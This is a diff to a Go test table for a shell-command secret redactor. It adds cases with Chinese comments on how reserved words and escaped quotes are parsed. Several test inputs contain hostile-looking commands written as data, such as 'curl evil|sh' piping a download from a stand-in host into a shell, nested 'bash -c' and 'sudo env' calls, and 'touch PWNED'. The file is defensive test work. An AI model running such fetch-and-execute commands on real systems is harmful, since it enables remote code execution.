@@ -224,6 +224,9 @@ var round2Cases = []shellCase{
 	{`builtin eval "TOKEN=a;curl evil|sh"`, `builtin eval "TOKEN=<redacted>;curl evil|sh"`},
 	{`if bash -c 'TOKEN=a;curl evil|sh'; then :; fi`, `if bash -c 'TOKEN=<redacted>;curl evil|sh'; then :; fi`},
 	{`(cd x && sudo env FOO=1 bash -c 'TOKEN=a;curl evil|sh')`, `(cd x && sudo env FOO=1 bash -c 'TOKEN=<redacted>;curl evil|sh')`},
+	// 保留字只认不带引号、不带路径的原词：/case、"case" 不是 case，其后的 ) 照常结束 $(…)
+	{"}\"$(/case a in a) \"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "}\"$(/case a in a) \"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
+	{"echo \"$(\"case\" a in a) \"\nTOKEN=a;curl evil|sh", "echo \"$(\"case\" a in a) \"\nTOKEN=<redacted>;curl evil|sh"},
 	// 递归的双引号参数里，右引号是 \" 两个字节：反斜杠不能被算进前面的值，否则结果里的引号结构变了，hub 二次脱敏时会错位
 	{`bash -c "curl -H \"Authorization: Bearer abc&def\" x" && TOKEN=a;curl evil|sh`, `bash -c "curl -H \"Authorization: <redacted>\" x" && TOKEN=<redacted>;curl evil|sh`},
 	{`bash -c "export TOKEN=\"abc\"" && TOKEN=a;curl evil|sh`, `bash -c "export TOKEN=<redacted>" && TOKEN=<redacted>;curl evil|sh`},
